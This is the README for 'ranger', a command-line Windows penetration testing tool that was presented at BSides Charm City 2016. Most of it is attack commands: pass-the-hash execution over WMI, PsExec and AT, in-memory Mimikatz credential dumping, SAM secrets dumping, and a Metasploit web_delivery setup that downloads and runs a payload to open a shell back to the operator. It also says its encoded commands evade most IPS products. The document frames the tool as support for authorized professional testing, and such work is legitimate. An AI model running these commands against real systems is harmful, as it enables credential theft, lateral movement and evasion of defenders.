# ranger
A tool to support security professionals access and interact with remote Microsoft Windows based systems.

This project was conceptualized with the thought process, we did not invent the bow or the arrow, 
just a more efficient way of using it.

Ranger is a command-line driven attack and penetration testing tool, which as the ability to use 
an instantiated catapult server to deliver capabilities against Windows Systems.  As long as a user 
has a set of credentials or a hash set (NTLM, LM, LM:NTLM) he or she can gain access to systems that 
are apart of the trust.

Using this capability a security professional can extract credentials out of memory in clear-text, 
access SAM tables, run commands, execute PowerShell scripts, Windows Binaries, and other tools.  
At this time the tool bypasses the majority of IPS vendor solutions unless they have been custom 
tuned to detect it. The tool was developed using our home labs in an effort to support security 
professionals doing legally and/or contractually supported activities.

More functionality is being added, but at this time the tool uses the community contributions 
from repositories related to the PowerShell PowerView, PowerShell Mimikatz and Impacket teams.

## Managing Ranger:
### Install:
```
wget https://raw.githubusercontent.com/funkandwagnalls/ranger/master/setup.sh
chmod a+x setup.sh
./setup.sh
rm setup.sh
```
### Update:
```
ranger --update
```

## Usage:
* Ranger uses a combination of methods and attacks, a method is used to deliver an attack/command
* An attack is what you are trying to accomplish
* Some items are both a method and attack rolled into one and some methods cannot use some of the attacks due to current limitations in the libraries or protocols

### Methods & Attacks:
```
--scout
--secrets-dump
```
### Method:
```
--wmiexec
--psexec
--atexec
```
### Attack:
```
--command
--invoker
--downloader
--executor
--domain-group-members
--local-group-members
--get-domain-membership
--get-forest-domains
--get-forest
--get-dc
--find-la-access
```

##Command Execution:
###Find Logged In Users:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] --scout
```
###SMBEXEC Command Shell:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
```

###PSEXEC Command Shell:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
```

###PSEXEC Command Execution:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
```

###WMIEXEC Command Execution:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
```

###WMIEXEC PowerShell Mimikatz Memory Injector:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
```

###WMIEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
```

###WMIEXEC Custom Code Memory Injector:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds"
```

###ATEXEC Command Execution:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
```

###ATEXEC PowerShell Mimikatz Memory Injector:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
```

###ATEXEC Metasploit web_delivery Memory Injector (requires Metasploit config see below):
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
```

###ATEXEC Custom Code Memory Injector:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -x "im.ps1" -f "Invoke-Mimikatz -DumpCreds" --no-encoder
```

###SECRETSDUMP Custom Code Memory Injector:
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
```

###Create Pasteable Mimikatz Attack:
```
ranger.py --invoker -q -v -vv -vvv
```

###Create Pasteable web_delivery Attack (requires Metasploit config see below):
```
ranger.py --downloader -q -v -vv -vvv
```

###Create Pasteable Executor Attack:
```
ranger.py --executor -q -v -vv -vvv
```
### Identifying Groups Members and Domains
* When identifying groups make sure to determine what the actual query domain is with the `--get-domain-membership`
* Then when you query a group use the optional `--domain`, which allows you to target a different domain than the one you logged into
```
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --get-domain-membership
ranger.py [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --domain "Domain.local2"
```

##Notes About Usage:
###Cred File Format:
* You can pass it a list of usernames and passwords or hashes in the following format in the same file:
```
username password
username LM:NTLM
username :NTLM
username **NO PASSWORD**:NTLM
PWDUMP
username PWDUMP domain
username password domain
username LM:NTLM domain
username :NTLM  domain
username **NO PASSWORD**:NTLM domain
PWDUMP domain
username PWDUMP domain
```

###Credential File Caveats:
* If you provide domain names in the file they will be used instead of the default WORKGROUP.  
* If you supply the domain name by command line `-d`, it will infer that you want to ignore all the domain names in the file.

###Command Line Execution:
* If you do not want to use the file you can pass the details through command line directly.
* If you wish to supply hashes instead of passwords just pass them through the password argument.  
* If they are PWDUMP format and you supply no username it will pull the username out of the hash.  
* If you supply a username it will think that the same hash applies to a different user.
* Use the following formats for password:
```
password
LM:NTLM
:NTLM
PWDUMP
```

###Targets and Target Lists:
* You can provide a list of targets either by using a target list or through the target option.  
* You can supply multiple target list files by comma separating them and it will aggregate the data and remove duplicates and then exclude your IP address from the default interface or the interface you provide. 
* The tool accepts, CIDR notations, small ranges (192.168.195.1-100) or large ranges (192.168.194.1-192.163.1.1) or single IP addresses.  
* Again just comma separating them by command line or put them in a new line delimited file.

###Exclusions and Exclusion Lists:
* You can exclude targets using the exclude arguments as well, so if you do not touch a little Class C out of a Class A it will figure that out for you.

### Intrusion Protection Systems (IPS):
* Mimikatz, Downloader and Executor use PowerShell memory injection by calling other services and protocols.
* The commands are double encoded and bypass current IPS solutions (even next-gen) unless specifically tuned to catch these attacks.  
* ATEXEC is the only one that currently lands on disk and does not encode, I still have some rewriting to do still.

### Web_delivery attacks:
* To setup Metasploit for the web_delivery exploit start-up Metasploit and configure the exploit to meet the following conditions.
```
use exploit/multi/script/web_delivery
set targets 2
set payload <choose your desired payload>
set lhost <your IP>
set lport <port for the shell make sure it is not a conflicting port>
set URIPATH /
set SRVPORT <the same as what is set by the -r option in ranger, defaults to 8888>
exploit -j
```
##FAQ

###Access Deined Errors for SMBEXEC and WMIEXEC
I'm getting access denied errors in Windows machines that are part of a WORKGROUP.

When not part of a domain, Windows by default does not have any administrative shares.  SMBEXEC relies on shares being enabled.  Additionally, WMIC isn't enabled on WORKGROUP machines.  SMBEXEC and WMIEXEC are made to target protocols enabled on domain systems.  While its certainly possible to enable these functions on a WORKGROUP system, note that you are introducing vulnerable protocols (after all, that's what this tool is made to attack).  Enabling these features on your primary home system that your significant other uses for Facebook as well is probably not the best idea.  
* Make sure this is a test box you own.  You can force the shares to be enabled by following the instructions here: http://www.wintips.org/how-to-enable-admin-shares-windows-7/
* If you want to determine what shares are exposed and then target them, you can use a tool like `enum4linux` and then use the `--share share_name` argument in ranger to try and execute SMBEXEC.

##Future Features:
###Nmap:
* The nmap XML feed is still in DRAFT and it is not functioning yet.

###Credential Parsing:
* Clean credential parsing is in development to dump to files.

###Colored Output:
* Add colored output with `https://pypi.python.org/pypi/colorama`

# Presented At:
[BSides Charm City 2016: April 23, 2016] (http://2016.bsidescharm.com/2016-talks)

# Distributions the tool is a part of:
[Black Arch Linux] (https://blackarch.org/)
